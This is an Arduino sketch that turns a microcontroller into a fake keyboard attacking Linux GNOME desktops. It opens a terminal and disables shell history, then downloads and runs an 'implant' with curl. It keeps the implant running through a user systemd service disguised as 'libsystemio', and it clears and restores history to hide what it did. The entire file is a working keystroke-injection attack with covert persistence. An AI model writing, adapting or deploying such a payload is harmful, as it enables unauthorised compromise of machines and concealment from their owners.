#include <Keyboard.h> 

// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();

  // Waiting 500ms for init
  delay(500);

  delay(3000);

  // Open run a command dialog
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  Keyboard.releaseAll();

  delay(50);

  // Open gnome terminal
  Keyboard.print("gnome-terminal");

  delay(50);
  
  typeKey(KEY_RETURN);

  delay(300);

  // Turn off history
  // cmd: set +o history
  Keyboard.print("set ");

  delay(300);

  print_char('=');

  delay(100);

  Keyboard.print("o history");

  delay(100);

  typeKey(KEY_RETURN);

  delay(300);

  // Delete last line from history
  // cmd: history -d -1
  Keyboard.print("history -d -1");

  delay(100);

  typeKey(KEY_RETURN);

  delay(300);

  // Download, change mod, execute and delete implant
  // cmd: curl -fs http://127.0.0.1/linuximplant -o linuximplant && chmod u+x && ./linuximplant && rm linuximplant
  Keyboard.print("curl -fs http");

  delay(300);
  
  print_char(';');

  delay(100);

  Keyboard.print("//127.0.0.1");

  delay(300);

  print_char(';');

  delay(100);

  Keyboard.print("8080/linuximplant -o linuximplant ");

  delay(300);

  print_char('7');

  delay(100);

  print_char('7');

  delay(100);

  Keyboard.print(" chmod u");

  delay(300);

  print_char('=');

  delay(100);

  Keyboard.print("x linuximplant ");

  delay(300);
  
  print_char('7');

  delay(100);

  print_char('7');

  delay(100);
  
  Keyboard.print(" ./linuximplant");

  delay(100);

  typeKey(KEY_RETURN);

  // Make implant persistant
  // Create systemd directory and file
  Keyboard.print("mkdir -p ");

  delay(300);

  print_char('`');

  delay(100);

  Keyboard.print("/.config/systemd/user ");

  delay(300);

  print_char('7');

  delay(100);

  print_char('7');

  delay(100);

  Keyboard.print(" touch ");

  delay(300);

  print_char('`');

  delay(100);

  Keyboard.print("/.config/systemd/user/libsystemio.service");

  delay(300);

  typeKey(KEY_RETURN);

  delay(200);

  typeKey(KEY_RETURN);
  
  // Create systemd service, start and enable service
  // libsystemio.service file:
  // [Unit]
  // Description=libsystemio
  //
  // [Service]
  // ExecStart=~/linuximplant
  // Restart=on-failure
  // SuccessExitStatus=3 4
  // RestartForceExitStatus=3 4
  //
  // [Install]
  // WantedBy=default.target
  //
  //
  // cmd: systemctl start libsystemio.service
  // cmd: systemctl enable libsystemio.service
  Keyboard.print("cat ");

  delay(300);

  print_char('.');

  delay(50);

  print_char('.');

  delay(100);

  Keyboard.print(" ");

  delay(100);

  print_char('`');

  delay(100);

  Keyboard.print("/.config/systemd/user/libsystemio.service");

  delay(300);

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.print("[");

  delay(200);

  print_char('u');

  delay(100);

  Keyboard.print("nit]");

  delay(200);

  typeKey(KEY_RETURN);

  print_char('d');

  delay(100);

  Keyboard.print("escription=libsystemio");

  delay(300);

  typeKey(KEY_RETURN);
  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("[");

  delay(200);

  print_char('s');

  delay(100);

  Keyboard.print("ervice]");

  delay(300);

  typeKey(KEY_RETURN);

  // CTRL + d
  Keyboard.press(KEY_LEFT_CTRL);

  delay(100);
  
  Keyboard.press('d');

  delay(50);
  
  Keyboard.release('d');

  delay(50);

  Keyboard.release(KEY_LEFT_CTRL);

  delay(300);

  Keyboard.print("echo ");

  delay(200);

  print_char('e');

  delay(100);

  Keyboard.print("xec");

  delay(200);

  print_char('s');

  delay(100);

  Keyboard.print("tart=");

  delay(200);

  print_char('`');

  delay(100);

  Keyboard.print("/linuximplant ");

  delay(200);
  
  print_char('.');

  delay(50);

  print_char('.');

  delay(100);

  Keyboard.print(" ");

  delay(100);

  print_char('`');

  delay(100);

  Keyboard.print("/.config/systemd/user/libsystemio.service");

  delay(300);

  typeKey(KEY_RETURN);

  Keyboard.print("cat ");

  delay(300);

  print_char('.');

  delay(50);

  print_char('.');

  delay(100);

  Keyboard.print(" ");

  delay(100);

  print_char('`');

  delay(100);

  Keyboard.print("/.config/systemd/user/libsystemio.service");

  delay(300);

  typeKey(KEY_RETURN);

  print_char('r');

  delay(100);

  Keyboard.print("estart=on-failure");

  delay(300);

  typeKey(KEY_RETURN);

  print_char('s');

  delay(100);

  Keyboard.print("uccess");

  delay(300);

  print_char('e');

  delay(100);

  Keyboard.print("xit");

  delay(300);

  print_char('s');

  delay(100);

  Keyboard.print("tatus=3 4");

  delay(300);

  typeKey(KEY_RETURN);

  print_char('r');

  delay(100);

  Keyboard.print("estart");

  delay(300);

  print_char('f');

  delay(100);

  Keyboard.print("orce");

  delay(300);

  print_char('e');

  delay(100);

  Keyboard.print("xit");

  delay(300);

  print_char('s');

  delay(100);

  Keyboard.print("tatus=3 4");

  delay(300);

  typeKey(KEY_RETURN);
  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("[");

  delay(200);

  print_char('i');

  delay(100);

  Keyboard.print("nstall]");

  delay(300);

  typeKey(KEY_RETURN);

  print_char('w');

  delay(100);

  Keyboard.print("anted");

  delay(300);

  print_char('b');

  delay(100);

  Keyboard.print("y=default.target");

  delay(300);

  typeKey(KEY_RETURN);

  // CTRL + d
  Keyboard.press(KEY_LEFT_CTRL);

  delay(100);
  
  Keyboard.press('d');

  delay(50);
  
  Keyboard.release('d');

  delay(50);

  Keyboard.release(KEY_LEFT_CTRL);
  
  delay(300);

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.print("systemctl --user enable --now libsystemio.service");

  delay(200);

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.print("systemctl --user start libsystemio.service");

  delay(200);

  typeKey(KEY_RETURN);

  delay(300);

  // Enable history
  // cmd: set -o history
  Keyboard.print("set -o history");

  delay(200);

  typeKey(KEY_RETURN);

  // Close terminal
  delay(200);

  Keyboard.press(KEY_LEFT_CTRL);

  delay(100);
  
  Keyboard.press(KEY_LEFT_SHIFT);

  delay(100);
  
  Keyboard.press('q');

  delay(50);

  Keyboard.release('q');

  delay(50);

  Keyboard.release(KEY_LEFT_SHIFT);

  delay(100);

  Keyboard.release(KEY_LEFT_CTRL);

  delay(100);
}

void print_char(char keyboard_char)
{
  delay(200);
  
  Keyboard.press(KEY_LEFT_SHIFT);

  delay(100);
  
  Keyboard.press(keyboard_char);

  delay(50);

  Keyboard.release(keyboard_char);

  delay(50);

  Keyboard.release(KEY_LEFT_SHIFT);

  delay(100);
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
